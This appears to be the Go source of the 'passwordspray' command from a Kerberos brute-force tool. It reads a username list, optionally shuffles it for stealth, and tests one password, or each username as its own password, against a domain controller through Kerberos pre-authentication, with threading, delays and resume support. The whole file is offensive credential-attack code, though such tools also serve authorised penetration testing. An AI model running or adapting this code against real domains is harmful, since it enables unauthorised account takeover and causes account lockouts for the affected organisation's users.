package cmd

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/abdelaaziz0/kerbrutal/util"

	"github.com/spf13/cobra"
)

var usernameList string
var password string

// var userAsPass bool

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args:   cobra.MinimumNArgs(1),
	PreRun: setupSession,
	Run:    passwordSpray,
}

func init() {
	passwordSprayCmd.Flags().BoolVar(&userAsPass, "user-as-pass", false, "Spray every account with the username as the password")
	rootCmd.AddCommand(passwordSprayCmd)
}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	if !userAsPass {
		if len(args) != 2 {
			logger.Log.Error("You must specify a password to spray with, or --user-as-pass")
			os.Exit(1)
		} else {
			password = args[1]
		}
	} else {
		password = "foobar"
	}
	stopOnSuccess = false

	usersChan := make(chan string, threads)
	defer cancel()
	defer closeValidUsersFile()
	defer closeResumeFile()

	var wg sync.WaitGroup
	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go makeSprayWorker(ctx, usersChan, &wg, password, userAsPass)
	}

	var lines []string
	if opsecMode && usernamelist != "-" {
		var err error
		lines, err = loadAndShuffleFile(usernamelist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
	} else {
		var scanner *bufio.Scanner
		if usernamelist != "-" {
			file, err := os.Open(usernamelist)
			if err != nil {
				logger.Log.Error(err.Error())
				return
			}
			defer file.Close()
			scanner = bufio.NewScanner(file)
		} else {
			scanner = bufio.NewScanner(os.Stdin)
		}
		for scanner.Scan() {
			line := scanner.Text()
			if line != "" {
				lines = append(lines, line)
			}
		}
		if err := scanner.Err(); err != nil {
			logger.Log.Error(err.Error())
		}
	}

	totalLines := len(lines)
	stopProgress := startProgressTicker(totalLines)
	defer stopProgress()

	start := time.Now()

	for _, usernameline := range lines {
		select {
		case <-ctx.Done():
			break
		default:
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				continue
			}
			userFull := fmt.Sprintf("%v@%v", username, domain)
			if shouldSkip(userFull) {
				atomic.AddInt32(&counter, 1)
				continue
			}
			applyDelay()
			usersChan <- username
		}
	}
	close(usersChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())
}
